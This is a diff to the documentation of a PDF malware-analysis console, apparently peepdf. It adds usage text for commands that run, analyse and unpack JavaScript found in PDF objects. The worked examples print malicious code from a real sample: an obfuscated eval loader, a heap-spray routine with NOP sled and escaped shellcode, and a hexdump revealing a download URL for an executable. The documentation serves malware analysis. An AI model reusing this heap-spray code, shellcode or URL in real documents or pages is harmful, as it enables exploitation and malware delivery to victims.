@@ -257,7 +257,8 @@ Exits from the console
 {{{
 Usage: filters object_id [version] [filter1 [filter2 ...]]
 
-Shows the filters found in the stream object or set the filters in the object (first filter is used first). The valid values for filters are the following:
+Shows the filters found in the stream object or set the filters in the object (first filter is used first).
+The valid values for filters are the following:
 	none: No filters
 	asciihex,ahx: /ASCIIHexDecode
 	ascii85,a85: /ASCII85Decode (Not implemented)
@@ -369,6 +370,146 @@ Objects: 6
 Root Object: 1
 Info Object: No
 Encrypted: No
+}}}
+<br/>
+===js===
+{{{
+Usage: js variable var_name
+Usage: js file file_name
+Usage: js object object_id [version]
+
+Executes the Javascript code stored in the specified variable, file or object
+}}}
+{{{
+PPDF> set jscode "var a = 8; a = a + 2; print('The content of the variable is '+a);"
+PPDF> js variable jscode
+The variable may not contain Javascript code, do you want to continue? (y/n) y
+The content of the variable is 10
+}}}
+First, we put Javascript code in a variable. After that we can use the _js_ command to execute it. There is a warning
+because the code is very short to be identified as Javascript code.
+<br/>
+===js_analyse===
+{{{
+Usage: js_analyse variable var_name
+Usage: js_analyse file file_name
+Usage: js_analyse object object_id [version]
+
+Analyses the Javascript code stored in the specified variable, file or object
+}}}
+This command perform some substitutions in the code in order to obtain the last stage of the Javascript code and search
+for escaped bytes and shellcodes. It's not always possible to be successful with this analysis, so maybe a manual
+approach with other commands will be necessary.
+{{{
+PPDF> js_analyze object 13
+
+Javascript code:
+
+
+var tX1PnUHy = new Array();
+function lRUWC(E79yB, NPvAvQ){
+  while (E79yB.length * 2 < NPvAvQ){
+    E79yB += E79yB;
+  }
+  E79yB = E79yB.substring(0, NPvAvQ / 2);
+  return E79yB;
+}
+function YVYohZTd(bBeUHg){
+var NTLv7BP = 0x0c0c0c0c;
+rpifVgf = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33" +
+"%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64"+ 
+"%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787"+ 
+"%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3"+ 
+"%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96" +
+"%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66"+ 
+"%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef"+ 
+"%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64"+ 
+"%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf..."
+
+Unescaped bytes:
+43 43 43 43 eb 0f 5b 33 c9 66 b9 80 01 80 33 ef   |CCCC..[3.f....3.|
+43 e2 fa eb 05 e8 ec ff ff ff 7f 8b 4e df ef ef   |C..........N...|
+ef 64 af e3 64 9f f3 42 64 9f e7 6e 03 ef eb ef   |.d..d..Bd..n....|
+ef 64 03 b9 87 61 a1 e1 03 07 11 ef ef ef 66 aa   |.d...a........f.|
+eb b9 87 77 11 65 e1 07 1f ef ef ef 66 aa e7 b9   |...w.e......f...|
+87 ca 5f 10 2d 07 0d ef ef ef 66 aa e3 b9 87 00   |.._.-.....f.....|
+21 0f 8f 07 3b ef ef ef 66 aa ff b9 87 2e 96 0a   |!...;...f.......|
+57 07 29 ef ef ef 66 aa fb af 6f d7 2c 9a 15 66   |W.)...f...o.,..f|
+aa f7 06 e8 ee ef ef b1 66 9a cb 64 aa eb 85 ee   |........f..d....|
+b6 64 ba f7 b9 07 64 ef ef ef bf 87 d9 f5 c0 9f   |.d....d.........|
+07 78 ef ef ef 66 aa f3 64 2a 6c 2f bf 66 aa cf   |.x...f..d*l/.f..|
+87 10 ef ef ef bf 64 aa fb 85 ed b6 64 ba f7 07   |......d.....d...|
+8e ef ef ef ec aa cf 28 ef b3 91 c1 8a 28 af eb   |.......(.....(..|
+97 8a ef ef 10 9a cf 64 aa e3 85 ee b6 64 ba f7   |.......d.....d..|
+07 af ef ef ef 85 e8 b7 ec aa cb dc 34 bc bc 10   |............4...|
+9a cf bf bc 64 aa f3 85 ea b6 64 ba f7 07 cc ef   |....d.....d.....|
+ef ef 85 ef 10 9a cf 64 aa e7 85 ed b6 64 ba f7   |.......d.....d..|
+07 ff ef ef ef 85 10 64 aa ff 85 ee b6 64 ba f7   |.......d.....d..|
+07 ef ef ef ef ae b4 bd ec 0e ec 0e ec 0e ec 0e   |................|
+6c 03 eb b5 bc 64 35 0d 18 bd 10 0f ba 64 03 64   |l....d5......d.d|
+92 e7 64 b2 e3 b9 64 9c d3 64 9b f1 97 ec 1c b9   |..d...d..d......|
+64 99 cf ec 1c dc 26 a6 ae 42 ec 2c b9 dc 19 e0   |d.....&..B.,....|
+51 ff d5 1d 9b e7 2e 21 e2 ec 1d af 04 1e d4 11   |Q......!........|
+b1 9a 0a b5 64 04 64 b5 cb ec 32 89 64 e3 a4 64   |....d.d...2.d..d|
+b5 f3 ec 32 64 eb 64 ec 2a b1 b2 2d e7 ef 07 1b   |...2d.d.*..-....|
+11 10 10 ba bd a3 a2 a0 a1 ef 68 74 74 70 3a 2f   |..........http:/|
+2f 62 69 6b 70 61 6b 6f 63 2e 63 6e 2f 6e 75 63   |/bikpakoc.cn/nuc|
+2f 65 78 65 2e 70 68 70                           |/exe.php|
+
+
+URLs in shellcode:
+	http://bikpakoc.cn/nuc/exe.php
+}}}
+<br/>
+===js_code===
+{{{
+Usage: js_code object_id [version]
+
+Shows the Javascript code found in the object
+}}}
+If the Javascript code found in the object can be executed and generates another Javascript code stage all
+the stages can be shown.
+{{{
+PPDF> js_code 13
+
+There are more than one Javascript code, do you want to see all (1) or just the last one (2)? 1
+
+================== Original Javascript code ==================
+function nofaq(lgc){var ppwsd="";for(rxr=0;rxr<lgc.length;rxr+=2){
+ppwsd+=(String.fromCharCode(parseInt(lgc.substr(rxr,5),19)));
+}
+eval(ppwsd);
+}
+nofaq("0D0A6452...");
+===================================================================
+
+================== Next stage of Javascript code ==================
+
+var tX1PnUHy = new Array();
+function lRUWC(E79yB, NPvAvQ){
+  while (E79yB.length * 2 < NPvAvQ){
+    E79yB += E79yB;
+  }
+  E79yB = E79yB.substring(0, NPvAvQ / 2);
+  return E79yB;
+}
+function YVYohZTd(bBeUHg){
+var NTLv7BP = 0x0c0c0c0c;
+rpifVgf = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001...");
+if (bBeUHg == 1){NTLv7BP = 0x30303030;}
+  
+		var i388Ag8 = 0x400000;
+		var JKn0PaC = rpifVgf.length * 2;
+		var NPvAvQ = i388Ag8 - (JKn0PaC + 0x38);
+		var E79yB = unescape("%u9090%u9090");
+		E79yB = lRUWC(E79yB, NPvAvQ);
+		var fwdFfLgn = (NTLv7BP - 0x400000) / i388Ag8;
+		for (var HEUAQgED = 0; HEUAQgED < fwdFfLgn; HEUAQgED ++ ){
+		tX1PnUHy[HEUAQgED] = E79yB + rpifVgf;
+  }
+}
+...
+===================================================================
 }}}
 <br/>
 ===Updating this documentation, please, be patient ;)===
